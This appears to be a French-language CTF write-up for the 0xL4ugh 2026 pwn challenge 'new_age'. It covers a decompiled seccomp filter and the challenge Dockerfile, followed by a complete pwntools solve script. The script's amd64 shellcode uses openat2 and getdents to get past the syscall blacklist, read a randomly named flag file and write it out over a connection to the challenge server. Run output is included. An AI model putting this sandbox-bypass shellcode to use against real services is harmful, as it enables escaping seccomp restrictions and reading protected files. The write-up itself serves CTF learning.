+++
date = '2026-01-26T19:02:42+01:00'
draft = false
title = '0xLaugh_01_26'
+++

<br>

## PWN
### new_age
#### attachments

<a href="/ctf/0xlaugh_01_26/new_age/new_age">new_age</a>
<a href="/ctf/0xlaugh_01_26/new_age/solve.py">solve.py</a><br><br>


#### reverse

Challenge de shellcoding avec des regles seccomp

```C
void setup(void)

{
  long lVar1;
  undefined8 uVar2;
  undefined8 in_R8;
  undefined8 in_R9;
  
  uVar2 = seccomp_init(SCMP_ACT_ALLOW);
  lVar1 = code_region;
  seccomp_arch_remove(uVar2,SCMP_ARCH_X86);
  seccomp_arch_remove(uVar2,SCMP_ARCH_X32);
  seccomp_rule_add(uVar2,0,READ,1,in_R8,in_R9,0x200000001,lVar1 + 0xc00,0);
  seccomp_rule_add(uVar2,0,WRITE,1,in_R8,in_R9,0x600000001,lVar1 + 0x400,0);
  seccomp_rule_add(uVar2,0,OPEN,0);
  seccomp_rule_add(uVar2,0,OPENAT,0);
  seccomp_rule_add(uVar2,0,EXECVE,0);
  seccomp_rule_add(uVar2,0,EXECVEAT,0);
  seccomp_rule_add(uVar2,0,FORK,0);
  seccomp_rule_add(uVar2,0,VFORK,0);
  seccomp_rule_add(uVar2,0,CLONE,0);
  seccomp_rule_add(uVar2,0,CLONE3,0);
  seccomp_rule_add(uVar2,0,SENDFILE,0);
  seccomp_rule_add(uVar2,0,CHROOT,0);
  seccomp_rule_add(uVar2,0,SOCKET,0);
  seccomp_rule_add(uVar2,0,CONNECT,0);
  seccomp_load(uVar2);
  return;
}
```
Le remove des archi 32 bits nous empeche de swap avec un int 0x80.
Il nous reste tout de même openat2,
Nous avons aussi le droit de lire vers code_region+0xc00
Et d'écrire depuis code_region+0x400
Mais comme le laisse sous entendre le DockerFile le nom du fichier est random:

```bash
FROM python:3.9-slim

RUN apt-get update && apt-get install -y socat && rm -rf /var/lib/apt/lists/*

WORKDIR /app

COPY new_age .

RUN useradd -m ctf
USER ctf
COPY flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt .

EXPOSE 1337

CMD socat TCP-LISTEN:1337,reuseaddr,fork EXEC:"/app/new_age"

```


#### solve

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

shellcode = asm("""
.att_syntax

/**********************/
/* création du label 'code_region' 
/* pour pouvoir le récuperer plus tard 
/* *********************/
code_region:


/**********************/
/* openat2 du directory courant
/*********************/
mov $0x002e, %rax
push %rax
mov %rsp, %rsi       

/* structure open_how */
sub $24, %rsp
movq $0,  (%rsp)    
movq $0,  8(%rsp)      
movq $0, 16(%rsp)      
mov %rsp, %rdx      

mov $24, %r10     
mov $-100, %rdi    
mov $437, %rax       
syscall



/*********************/
/* getdents pour avoir la 
/*liste de fichiers 
/*********************/
mov %rax, %rdi        
sub $0x400, %rsp       
mov %rsp, %rsi        
mov $0x400, %rdx
mov $217, %rax
syscall


/********************/
/* openat2 du premier fichier 
/* avec une boucle pour iterer sur les 
/* differents nom de fichier
/********************/
mov $0, %r9
mov $2, %r10
loop:
    movzwq 0x10(%rsi), %rcx
    add %rcx, %rsi
    dec %r10
    cmp %r9, %r10   
    jne loop
lea 0x13(%rsi), %rsi   
mov %rbx, %rdi  

/* struct open_how */
sub $24, %rsp
movq $0,  (%rsp)    
movq $0,  8(%rsp)   
movq $0, 16(%rsp)     
mov %rsp, %rdx

mov $24, %r10
mov $-100, %rdi
mov $437, %rax       
syscall



/**************************/
/* récuperation de 'code_region' 
/* et read du fichier vers 
/* code_region+0xc00
/**************************/

lea code_region(%rip), %rdi
add $0xc00, %rdi
mov %rdi, %rsi
mov $0x4, %rdi
mov $0x50, %rdx
mov $0x0, %rax
syscall




/*******************/
/* enorme write depuis
/* code_region+0x400
/*******************/

lea code_region(%rip), %rdi
add $0x400, %rdi
mov %rdi, %rsi
mov $0x1, %rdi
mov $0x850, %rdx
mov $0x1, %rax
syscall

""")



# io = process("./new_age")
io = connect("159.89.106.147", 1337)

io.sendline(shellcode)
res = io.recvall(timeout=1)
res = res.split(b"0x")[1]
print(b"0x" + res)

```

```bash
└─$ /home/sk4r/pwnenv/bin/python /home/sk4r/CTF/2026/OxLaugh/pwn_new_age/solve.py
[+] Opening connection to 159.89.106.147 on port 1337: Done
[+] Receiving all data: Done (2.16KB)
[*] Closed connection to 159.89.106.147 port 1337
b"0xL4ugh{xxxxxxxxxxxxxxxxxxxxxxxx}\n\x00\x00\x00\x00\x00\x00\x00"
```

Thx. 
<br>
Sk4r.
